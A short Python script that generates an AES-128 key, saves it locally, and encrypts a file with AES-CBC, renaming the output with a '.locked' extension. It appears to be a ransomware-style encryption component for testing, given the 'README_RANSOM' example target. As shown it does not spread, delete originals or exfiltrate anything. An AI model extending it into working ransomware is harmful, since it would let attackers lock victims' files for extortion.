from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

# Generate a random 16-byte key (for AES-128)
key = get_random_bytes(16)

# Save the key to a file (for testing purposes)
with open("encryption_key.key", "wb") as key_file:
    key_file.write(key)

# Encrypt a file
def encrypt_file(file_path, key):
    iv = get_random_bytes(16)  # Generate a random IV
    cipher = AES.new(key, AES.MODE_CBC, iv)
    
    with open(file_path, "rb") as file:
        plaintext = file.read()
    
    padded_data = pad(plaintext, AES.block_size)
    encrypted_data = iv + cipher.encrypt(padded_data)  # Prepend IV to encrypted data
    
    encrypted_file_path = file_path + ".locked"
    with open(encrypted_file_path, "wb") as encrypted_file:
        encrypted_file.write(encrypted_data)
    
    return encrypted_file_path

# Example usage
file_to_encrypt = "test/README_RANSOM.txt.locked"
encrypted_file = encrypt_file(file_to_encrypt, key)
print(f"File encrypted: {encrypted_file}")
print(f"Encryption key saved to: encryption_key.key")